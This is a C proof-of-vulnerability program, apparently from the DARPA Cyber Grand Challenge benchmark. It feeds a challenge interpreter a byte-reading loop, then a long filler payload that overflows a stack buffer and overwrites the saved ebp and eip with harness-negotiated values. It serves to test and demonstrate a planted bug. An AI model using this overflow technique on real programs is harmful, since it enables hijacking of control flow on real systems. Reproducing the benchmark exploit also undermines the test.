/*
 * Copyright (c) 2015 Kaprica Security, Inc.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */
#include "libpov.h"

int main(int cgc_argc, char *cgc_argv[]) {
  type1_vals t1;
  cgc_type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);

  unsigned char *line = NULL;
  unsigned int linesize = 0;
  cgc_delimited_read(STDIN, &line, &linesize, (unsigned char *)"\n", 1);
  cgc_delimited_read(STDIN, &line, &linesize, (unsigned char *)"\n", 1);
  cgc_delimited_read(STDIN, &line, &linesize, (unsigned char *)"\n", 1);

  // program to cgc_read one byte and inc ptr
  char* read_loop = "+[>,]\n";
  cgc_transmit_all(STDOUT, read_loop, cgc_strlen(read_loop));

  char *payload = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&";
  char term = 0;

  // Fill up data buffer
  for (cgc_size_t i = 0; i < 512; i++)
    cgc_transmit_all(STDOUT, payload, 64);

  // Padding to stack frame
  cgc_transmit_all(STDOUT, payload, 23);

  // ebp overwrite
  t1.regval |= 0x01010101;
  cgc_transmit_all(STDOUT, &t1.regval, 4);

  // eip overwrite
  t1.ipval |= 0x01010101;
  cgc_transmit_all(STDOUT, &t1.ipval, 4);

  // end transmission so function returns
  cgc_transmit_all(STDOUT, &term, 1);

  unsigned char buf[4];
  cgc_length_read(STDIN, buf, sizeof(buf));
  return 0;
}
